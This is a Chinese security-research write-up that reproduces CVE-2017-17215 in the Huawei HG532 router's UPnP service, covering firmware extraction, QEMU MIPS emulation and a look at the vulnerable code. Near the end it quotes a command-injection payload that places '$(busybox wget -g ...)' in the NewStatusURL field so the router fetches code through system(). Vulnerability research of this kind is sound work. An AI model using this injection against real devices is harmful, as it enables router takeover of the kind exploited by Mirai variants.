*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
*本文作者：kczwa1，本文属 FreeBuf原创奖励计划，未经许可禁止转载。
1.基本信息：
2017/11/27，Check Point 软件技术部门报告了一个华为 HG532 产品的远程命令执行漏洞(CVE-2017-17215)，Mirai的升级版变种中已经使用该漏洞。看起来是个很简单的漏洞了，书上得来终觉浅，须知此事要躬行，复现和分析的过程中遇到很多坑，写文记录一下详细步骤。
华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。
分析环境是ubuntu 16.04.
先用binwalk 解压一下：
根据 Check Point 的报告，漏洞点位于 UPnP 服务中,file命令看一下,可以看到upnp应该是跑在MIPS 32 位 大端架构系统
2.配置复现环境：
安装 qemu：
sudo apt-get install qemu sudo apt-get install qemu-user-static sudo apt-get install qemu-system
安装网络配置工具：
apt-get install bridge-utils uml-utilities
修改 ubuntu主机网络配置，将ubuntu主机系统中的网络接口配置文件 /etc/network/interfaces 修改为如下内容：
创建QEMU的网络接口启动脚本（/etc/qemu-ifup）并保存为如下内容：
赋予文件/etc/qemu-ifup 可执行权限：
sudo chmod a+x /etc/qemu-ifup
重启网络使所有的配置生效：
sudo /etc/init.d/networking restart
关闭ens33，启动桥连网络br0
sudo ifdown eth0 sudo ifup br0
从https://people.debian.org/~aurel32/qemu/mips/下载对应的debian mips qemu镜像
其他的帖子里有各种下载qemu镜像的地址，试了几个下载都不好用，各种坑
我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。
启动qemu运行刚镜像：
sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap
好的，假如一切顺利，可以看到一个qemu虚拟机，用root/root登录进去:
发现网络不通，ifconfig -a 看一下发现网络接口为eth1：
将nano /etc/network/interfaces 文件中的eth0改为eth1：
再用ifup eth1 将eth1启起来，运气好的话此时网络已经好了。
直接操作虚拟机显然比较麻烦，在ubuntu上搞个SSH 连进来，ssh root@虚拟机ip
将之前解压的固件包拷贝到虚拟机里面：
scp -r ./squashfs-root root@虚拟机ip:/root/
完成搭建路由器固件运行的环境。
3.复现漏洞：
第一个问题是怎么让路由器里的服务启起来，我们也不知道是哪个文件会去处理80端口过来的请求，先看下checkpoint报告里的payload
在固件文件夹下搜一下 ctrlt 和 DeviceUpgrade_1，并没有文件名含有这2个词语，再搜下包含这2个词语的文件：
找到固件所在的位置，想直接执行下upnp这个文件，报错,缺少相应的so文件造成。
chroot /root/squashfs-root /bin/sh来切换根目录到路由器文件系统，执行成功：
可是发包过去仍然失败，应该是并没有启动监听服务
那找下端口37215
端口号只出现在mic文件内，看下文件内容：
看字符串像是一个跟网络服务相关的文件，试下运行一下：
看起来像是对了，
ubuntu上nc -vlp 80 监听一下端口，跑一下exp，80端口收到路由器发来的wget 请求包。
4.简单分析：
分析一下upnp中的关键代码:
根据上面payload图，newstatusurl这个节点值为 <NewStatusURL>$(busybox wget -g xxxx ;xx;xx)</NewStatusURL>
snprintf(a0,0x400,"upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -",a3)
其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行
system（a0）
如果看完整篇文章想上手试一下路由器漏洞的话，不要忘了当初你是为什么放弃的.
*本文作者：kczwa1，本文属 FreeBuf原创奖励计划，未经许可禁止转载。